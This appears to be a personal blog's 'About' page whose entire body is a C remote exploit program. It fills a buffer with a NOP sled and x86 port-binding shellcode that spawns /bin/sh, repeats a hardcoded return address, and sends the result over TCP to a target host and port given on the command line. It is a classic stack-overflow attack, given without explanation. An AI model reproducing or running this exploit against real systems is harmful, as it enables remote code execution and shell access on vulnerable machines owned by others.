---
layout: page
permalink: /about/
title: About Neil
tagline: Ronneil, Neil
tags: [about, hacking]
modified: 9-9-2013
comments: true
image:
  feature: texture-feature-01.jpg
---

{% highlight c %}
#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>

//Portbinding Shellcode

char shellcode[] =
"\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
"\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
"\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
"\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
"\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
"\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";

//standard offset (probably must be modified)
#define RET 0xbffff5ec

int main(int argc, char *argv[]) {
    char buffer[1064];
    int s, i, size;
    struct sockaddr_in remote;
    struct hostent *host;

    if (argc != 3) {
        printf("Usage: %s target-ip port\n", argv[0]);
        return -1;
    }

    // filling buffer with NOPs
    memset(buffer, 0x90, 1064);

    //copying shellcode into buffer
    memcpy(buffer+1001-sizeof(shellcode) , shellcode, sizeof(shellcode));

    // the previous statement causes a unintential Nullbyte at buffer[1000]
    buffer[1000] = 0x90;

    // Copying the return address multiple times at the end of the buffer...

    for(i=1022; i < 1059; i+=4) {
        * ((int *) &buffer[i]) = RET;
    }

    buffer[1063] = 0x0;

    //getting hostname

    host=gethostbyname(argv[1]);

    if (host==NULL) {
        fprintf(stderr, "Unknown Host %s\n",argv[1]);
        return -1;
    }

    // creating socket...
    s = socket(AF_INET, SOCK_STREAM, 0);

    if (s < 0) {
        fprintf(stderr, "Error: Socket\n");
        return -1;
    }

    //state Protocolfamily , then converting the hostname or IP address, and getting port number
    remote.sin_family = AF_INET;
    remote.sin_addr = *((struct in_addr *)host->h_addr);
    remote.sin_port = htons(atoi(argv[2]));

    // connecting with destination host

    if (connect(s, (struct sockaddr *)&remote, sizeof(remote))==-1) {
        close(s);
        fprintf(stderr, "Error: connect\n");
        return -1;
    }

    //sending exploit string
    size = send(s, buffer, sizeof(buffer), 0);
    if (size==-1) {
        close(s);
        fprintf(stderr, "sending data failed\n");
        return -1;
    }

    // closing socket

    close(s);

}
{% endhighlight %}